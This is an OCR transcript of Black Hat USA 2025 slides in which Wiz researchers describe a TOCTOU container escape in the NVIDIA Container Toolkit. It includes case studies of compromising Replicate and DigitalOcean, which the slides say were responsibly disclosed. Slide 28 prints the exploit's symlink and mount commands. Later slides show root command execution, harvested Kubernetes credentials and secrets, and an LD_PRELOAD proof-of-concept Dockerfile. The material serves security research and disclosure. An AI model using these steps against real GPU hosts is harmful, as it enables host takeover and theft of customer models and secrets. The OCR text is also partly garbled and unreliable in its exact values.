---
title: "Breaking Out of The AI Cage Pwning AI Providers with NVIDIA Vulnerabilities"
speakers: ["Andres Riancho", "Hillai Ben-Sasson", "Ronen Shustin"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Andres Riancho&Hillai Ben-Sasson&Ronen Shustin_Breaking Out of The AI Cage Pwning AI Providers with NVIDIA Vulnerabilities.pdf"
pages: 53
sha256: "e49e2157a9f30987f79632cbe9cdf559f0fb930ab89de86859f678dfc8c2f285"
text_chars: 10716
ocr_pages: 14
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.2
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:04:49Z"
---
# Breaking Out of The AI Cage Pwning AI Providers with NVIDIA Vulnerabilities

**Speakers:** Andres Riancho, Hillai Ben-Sasson, Ronen Shustin  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Andres Riancho&Hillai Ben-Sasson&Ronen Shustin_Breaking Out of The AI Cage Pwning AI Providers with NVIDIA Vulnerabilities.pdf` (53 pages)


## Slide 1

Hillai Ben-Sasson Andres Riancho

@hillai @AndresRiancho


> Recovered by OCR — confidence 86/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WIZ Research
BREAKING OUT
OF THE Al CAGE
Pwning Al Providers with NVIDIA Vulnerabilities
Hillai Ben-Sasson X @hillai black hat
Andres Riancho XX @AndresRiancho USA 2025
```

## Slide 2

## **About us**

- Hillai and Andres 👋

- Based in Israel 🇮🇱 and Argentina 🪄

- • Security Researchers at Wiz

🇦🇷

- ☁

- • Specialize in cloud security research

Hillai Ben-Sasson @hillai

Andres Riancho

- @AndresRiancho

## Slide 3

## **AI vulnerability experience**

**_AI Data Sharing_**

**Microsoft data leak** : 38TB of data exposed by AI researchers

**_AI Services_ For end-users**

**DeepLeak** : DeepSeek exposed sensitive info, including chats

**_AI Cloud_**

**AI-as-a-Service**

Hugging Face Replicate SAP AI Core

**_AI Infrastructure_ Servers and libraries**

Ollama Redis NVIDIA Triton NVIDIA Container Toolkit

## Slide 4

## **AI vulnerability experience**

**_AI Data Sharing_**

**Microsoft data leak** : 38TB of data exposed by AI researchers

##### **_AI Services_**

**For end-users**

**DeepLeak** : DeepSeek exposed sensitive info, including chats

**_AI Cloud_**

**AI-as-a-Service**

Hugging Face Replicate SAP AI Core

**_AI Infrastructure_ Servers and libraries**

Ollama Redis NVIDIA Triton

**NVIDIA Container Toolkit**

## Slide 5

### **_Agenda_**

**_01_** AI Infrastructure 101

**_02_** NVIDIA Container Toolkit

**_03_** Escaping the Container

**_04_** Case Studies

**_05_** Summary and Takeaways

#RSAC

## Slide 6

**AI Infrastructure 101**

## Slide 7

## **How do I run AI?**

Vector  Training  Inference
Databases Frameworks Servers
GPUs

## Slide 8

## **GPUs!**

- The one common factor between all AI providers

- What interfaces do they expose to developers?

- What’s the potential attack surface?

## Slide 9

**GPUs!**


> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
16S) GPUs!
NVIDIA Corporation
Verified
22 17.7k followers © 2788 San Tomas Expressway, Sant... eC https://nvidia.com
(i) Overview [) Repositories 583 FA Projects 8 © Packages & People 101
```

## Slide 10

## **NVIDIA Container Toolkit**

What is it, and how we hacked it

## Slide 11

## **NCT 101**

- Container runtime library

- Developed by NVIDIA

- Enables Linux containers to access NVIDIA GPUs

## Slide 12

**NCT 102**


> Recovered by OCR — confidence 77/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NCT 102 ©&
invokes
nvidia-container-runtime jue runc
initializes
© nvidia-container-runtime-hook
```

## Slide 13

**Interesting mounts**


> Recovered by OCR — confidence 72/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Interesting mounts
$ mount
[...]
/dev/nvmeOn1ip1 /usr/lib/x86_64-lLinux-gnu/libnvidia-ml.so.570.133.20 type xfs
/dev/nvmeOn1ip1 /usr/lib/x86_64-Linux-gnu/libnvidia-cfg.so.570.133.20 type xfs
/dev/nvmeOn1p1 /usr/lib/x86_64-Linux-gnu/libcuda.so.570.133.20 type xfs
/dev/nvmeOnip1 /usr/lib/x86_64-Linux-gnu/libcudadebugger.so.570.133.20 type xfs
/dev/nvmeOn1ip1 /usr/lib/x86_64-lLinux-gnu/libnvidia-opencl.so.570.133.20 type xfs
/dev/nvmeOn1p1 /usr/lib/x86_64-Linux-gnu/libnvidia-gpucomp.so.570.133.20 type xfs
/dev/nvmeOn1ip1 /usr/lib/x86_64-Linux-gnu/libnvidia-ptxjitcompiler.so.570.133.20 type xfs
/dev/nvmeOn1p1 /usr/lib/x86_64-Linux-gnu/libnvidia-allocator.so.570.133.20 type xfs
/dev/nvmeOnip1 /usr/lib/x86_64-Linux-gnu/libnvidia-pkcs11.s0.570.133.20 type xfs
/dev/nvmeOn1ip1 /usr/lib/x86_64-linux-gnu/libnvidia-pkcs11l-openssl3.s0.570.133.20 type xfs
/dev/nvmeOn1ip1 /usr/lib/x86_64-linux-gnu/libnvidia-nvvm.so.570.133.20 type xfs
```

## Slide 14

Host
Container
mount ( )
/var/lib/…/etc/hostname /etc/hostname

## Slide 15

Host

Container
mount ( )
/usr/local/cuda/ /usr/lib/…
compat/…

## Slide 16

**Bind mounts inside the container**


> Recovered by OCR — confidence 94/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bind mounts inside the container
root@host# cat /var/log/nvidia-container-toolkit. log
[nvc_mount.c:134] mounting
at
```

## Slide 17

## **What’s next?**

• Trick NVIDIA Container Toolkit into mounting the host file system inside the container

- Create a specially crafted docker image

## Slide 18

Host
Container
1 symlink 2 mount ( )
../../../../../../../../../../ /usr/local/cuda/ /usr/lib/…
compat/…

## Slide 19

**Nope!**


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Nope!
root@host# docker run -it --rm --gpus all wiz-naive bash
nvidta-container-cli: container error:
/var/lib/docker/overlay2/{1ID}/merged
```

## Slide 20

## **Fact-checking**

- Libraries from **/compat/lib*.so.*** are mounted to the same filenames in **/usr/lib/x86_64-linux-gnu/**

- Symbolic links are **normalized** before calling mount()

- There is a **security control** that prevents us from mounting paths outside the container’s root

## Slide 21

## **Goal**

**Bypass** the security control and **mount** the host filesystem inside the container.

## Slide 22

/usr/local/cuda/compat/
libnvidia-ml.so.6 libnvidia-ml.so.6
libnvidia-ml.so.7 lib*.so.* libnvidia-ml.so.7
README.md
Mounts Validated Mounts
libnvidia-ml.so.6 libnvidia-ml.so.6
do_path_resolve ( )
libnvidia-ml.so.7 libnvidia-ml.so.7
/usr/lib/x86_64-linux-gnu/
Validated Mounts
libnvidia-ml.so.6 libnvidia-ml.so.6
mount ( )
libnvidia-ml.so.7 libnvidia-ml.so.7

## Slide 23

## **TOCTOU vulnerability**

**Time of check:** The security control in **do_path_resolve()** is run once per path, before any **mount** () is called

**Time of use: mount** () calls can make changes the file system structure, potentially invalidating the security assertions.

## Slide 24

/usr/local/cuda/compat/ /usr/lib/x86_64-linux-gnu/
libnvidia-ml.so.6 libnvidia-ml.so.6
mount ( )
libnvidia-ml.so.7

## Slide 25

**/usr/local/cuda/compat/**

libnvidia-ml.so.7

/usr/lib/x86_64-linux-gnu/

libnvidia-ml.so.6

## Slide 26

**/usr/local/cuda/compat/**

../../../../../../../..

libnvidia-ml.so.7

**/usr/lib/x86_64-linux-gnu/**

libnvidia-ml.so.6

## Slide 27

**/usr/local/cuda/compat/** libnvidia-ml.so.7 ../../../../../../../..

libnvidia-ml.so.7

/usr/lib/x86_64-linux-gnu/

libnvidia-ml.so.6

**mount ( )**

libnvidia-ml.so.7 ../../../../../../../..

## Slide 28

**Final exploit**


> Recovered by OCR — confidence 88/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Final exploit
mkdir -p /usr/local/cuda/compat/
mkdir -p /usr/lib/x86_64-Linux-gnu
mkdir -p /usr/local/cuda/compat/libnvidia-ml.so.6/
touch /usr/local/cuda/compat/libnvidia-ml.so.7
RUN ../../../usr/local/cuda/compat /usr/lib/x86_64-Linux-gnu/libnvidia-ml.so.6
```

## Slide 29

## **The vulnerability in a nutshell**

- **Critical** container escape vulnerability

- Mount host filesystem into the container

- If you control the container image – you win

## Slide 30

## **The dream vulnerability**

- One vulnerability affecting the entire cloud ecosystem

- How does each vendor handle a brand new 0-day?

- Let’s dive into two different case studies

## Slide 31

Case study #1 **Replicate**

## Slide 32

**Replicate**


> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Replicate
Popular models
bytedance / sdxl-lightning-
Astep
SDXL-Lightning by ByteDance: a fast text-
to-image model that makes high-quality
images in 4 steps
Updated 2 months, 2 weeks ago 7 972.6M runs
openai / whisper
Convert speech in audio to text
Updated 6 months, 1 week ago <7 91M runs
xinntao / gfpgan
Practical face restoration algorithm for *old
photos* or *Al-generated faces*
Updated 2 years, 8 months ago 3? 30.7M runs
Explore Pricing Docs Blog Changelog Signin
851-labs / background-
remover
Remove backgrounds from images.
Updated 5 months, 2 weeks ago & 2.9M runs
salesforce / blip
Generate image captions
Updated 2 years, 2 months ago 7 165.5M runs
bytedance / hyper-flux-8step
Hyper FLUX 8-step by ByteDance
Updated 2 months, 2 weeks ago 87 13M runs
```

## Slide 33

**What’s a “Cog”?**


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What's a “Cog”?
cog Public © Watch 68 w
Cog: Containers for machine learning
Cog is an open-source tool that lets you package machine learning models in a standard, production-ready
container.
You can deploy your packaged model to your own infrastructure, or to Replicate.
```

## Slide 34

## Slide 35

**$ cog predict --RCE**


> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
S$ cog predict --RCE
Prediction
Input Output
Form JSON Nodejs Python Elixir HTTP Cog Preview JSON
cmd
id uid=O0(root) gid=O0(root) groups=0(root)
Generated in
8.5 milliseconds
```

## Slide 36

## **What’s next?**

- We have access to the host filesystem

- Let’s scan it for interesting files!

- First stop: `/proc`

## Slide 37

## **Hello Redis my old friend**


> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Hello Redis my old friend
--redis-url=rediss://: PASSWORD )@predictions-queue-blue-redis-master.svc.internal.us.c.replicate.net:6378/0
```

## Slide 38

## **I've come to talk with you again**

Our AI Model
AI Model
Replicate
End User
AI Model
Prompt
Prediction
Redis
Task Queue

## Slide 39

## **I've come to talk with you again**

Our AI Model
AI Model
AI Model
Redis
Task Queue

## Slide 40

## **Potential impact**

Prompts

Predictions Interference

Public + Private

## Slide 41

**Plot twist**

## Slide 42

Attacker

Malicious Cog Container

Replicate Pod

Container Escape

Replicate Node

Password Centralized Disclosure Redis Database

Interference

Predictions

Prompts

## Slide 43

Case study #2 **DigitalOcean**

## Slide 44

**DigitalOcean Paperspace**


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DigitalOcean Paperspace
1) DigitalOcean Products Resources Pricing We're hiring!
Say hello to
Deployments.
Deployments make model inference simple and scalable.
Select Model Choose Runtime Serve Model
1 Select an existing model or () ? Choose from your preferred () 5 Set instance, types,
upload a new model from runtime eg TensorFlow autoscaling behavior, and
the interface or CLI. Serving, Flask, etc. other parameters. Click
deploy!
```

## Slide 45

## **What’s next?**

- We have access to the Node’s filesystem

- Let’s scan it for interesting files!

👀

- Do we have K8s credentials?

## Slide 46

**We do**


> Recovered by OCR — confidence 89/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
We do
root@do# ls -la /usr/lib/x86_64-Linux-gnu/libnvidia-ml.so.7/etc/kubernetes/ssl
total 36
Jul
Jul
Jul
Jul
Jul
Jul
Jul
Jul
Jul
kube-ca.pem
kube-node-key.pem
kube-node. pem
kube-proxy-key.pem
kube-proxy.pem
kubecfg-kube-node. yaml
```

## Slide 47

#### •••

- $ kubectl get nodes I wc -l

727

- $ kubectl get pod/8e43a5d88dd9238830b44bc0c335d088a-5656ff6d34-hjrxd

andresriancho/testos-container

gradient-container-registry-2a407bec-9680-450a-acd7-609bf010274a

- $ kubectl get secret/gradient-container-registry-2a407bec-9680-450a-acd7-609bf010274a

e Y J- I ■ • • ■<sup>: -</sup> ■ ■ •• .._. ■ • • ■ : ■ ■• • .- ■<sup>■</sup> ■<sup>■</sup> • 1 ■ • 1 **.** ■ I :■ ■ ■ **a** 1 : • : , ■• ■·• : • ■ 1 ■ 1 • ■ I ■ .. ■• • : 2 YT J Wd LJ'I<sup>•</sup> •<sup>■</sup> ■ 1 • ■ ■<sup>■</sup> •■ 11 • 'I ■ ■ ■ ■<sup>"rl'</sup> ■<sup>•</sup> • "• • • I ■ • ■ r ■ **1** •�19 "I. : Secret ■ •.■ • ■ **r..** ■ ■ ■ .- **.** . • ■ 1 ■ r.J1 • ■ ■

## Slide 48

Attacker

Malicious Container

DigitalOcean Pod

Container Escape

DigitalOcean Node

Strong K8s Credentials

Models

Source Code

Customer Secrets

## Slide 49

## **Takeaways**

Let’s sum things up

✍

## Slide 50

## **Responsible disclosure**

- All issues have been reported to respective vendors

   - NVIDIA assigned CVE-2024-0132

   - Fixed at version 1.16.2

- Collaborated with security teams of NVIDIA, Replicate, and DigitalOcean to fix the issues

## Slide 51

## **Takeaways**

- AI introduces a new software stack, with new attack vectors

   - Inference servers, training frameworks, vector databases, GPU drivers…

- AI security is infrastructure security

   - Keep your critical dependencies up-to-date

- Containers should not be a sole security barrier

   - Can be broken using misconfigurations and logical vulnerabilities

   - Utilize virtualization-based barriers and safe container technologies (i.e. gVisor)

## Slide 52

**On the next episode of Wiz Research…**

CVE-2025-23266


> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
On the next episode of Wiz Research...
FROM busybox
ENV LD_PRELOAD=/proc/self/cwd/poc.so
ADD poc.so /
```

## Slide 53

# **Thank you!**

@hillai  @AndresRiancho

research@wiz.io

wiz.io/blog
